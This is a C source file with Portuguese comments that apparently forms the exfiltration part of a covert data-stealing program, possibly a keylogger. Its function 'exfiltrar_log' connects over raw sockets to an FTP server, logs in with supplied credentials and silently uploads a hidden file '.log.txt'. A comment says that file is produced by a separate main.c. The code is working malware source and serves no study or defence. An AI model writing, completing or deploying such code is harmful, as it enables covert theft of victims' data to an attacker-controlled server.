#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// Função isolada para exfiltração via FTP (Sockets Puros)
void exfiltrar_log(const char *ip_server, const char *user, const char *pass) {
    int sock_control, sock_data;
    struct sockaddr_in server_addr, data_addr;
    char buffer[2048];
    int a, b, c, d, p1, p2;

    // 1. Criação do Socket de Controlo (Porta 21)
    sock_control = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_control < 0) return;

    // Limpa a struct para evitar lixo de memória
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(21);
    inet_pton(AF_INET, ip_server, &server_addr.sin_addr);

    // Conecta ao servidor FileZilla
    if (connect(sock_control, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock_control);
        return;
    }
    recv(sock_control, buffer, sizeof(buffer), 0); // Recebe o "Welcome" do server

    // 2. Autenticação
    sprintf(buffer, "USER %s\r\n", user);
    send(sock_control, buffer, strlen(buffer), 0);
    recv(sock_control, buffer, sizeof(buffer), 0);

    sprintf(buffer, "PASS %s\r\n", pass);
    send(sock_control, buffer, strlen(buffer), 0);
    recv(sock_control, buffer, sizeof(buffer), 0);

    // 3. Entrar em Modo Passivo (PASV)
    // O servidor abrirá uma porta de dados e dirá qual é
    send(sock_control, "PASV\r\n", 6, 0);
    recv(sock_control, buffer, sizeof(buffer), 0);

    // Extração da porta da resposta: 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
    char *start = strchr(buffer, '(');
    if (!start) {
        close(sock_control);
        return;
    }
    sscanf(start, "(%d,%d,%d,%d,%d,%d)", &a, &b, &c, &d, &p1, &p2);
    
    // Cálculo da porta de dados: (p1 * 256) + p2
    int porta_final = (p1 * 256) + p2;

    // 4. Conexão de Dados (Onde o ficheiro viaja de facto)
    sock_data = socket(AF_INET, SOCK_STREAM, 0);
    memset(&data_addr, 0, sizeof(data_addr));
    data_addr.sin_family = AF_INET;
    data_addr.sin_port = htons(porta_final);
    inet_pton(AF_INET, ip_server, &data_addr.sin_addr);

    if (connect(sock_data, (struct sockaddr *)&data_addr, sizeof(data_addr)) == 0) {
        // 5. Comando de Upload (STOR) no canal de controlo
        send(sock_control, "STOR .log.txt\r\n", 15, 0);
        
        // Abre o ficheiro gerado pelo teu main.c
        FILE *f = fopen(".log.txt", "rb");
        if (f) {
            char file_buf[1024];
            int n;
            // Lê o ficheiro em blocos e envia pelo socket de dados
            while ((n = fread(file_buf, 1, sizeof(file_buf), f)) > 0) {
                send(sock_data, file_buf, n, 0);
            }
            fclose(f);
        }
        close(sock_data);
    }

    // 6. Encerramento
    send(sock_control, "QUIT\r\n", 6, 0);
    close(sock_control);
}
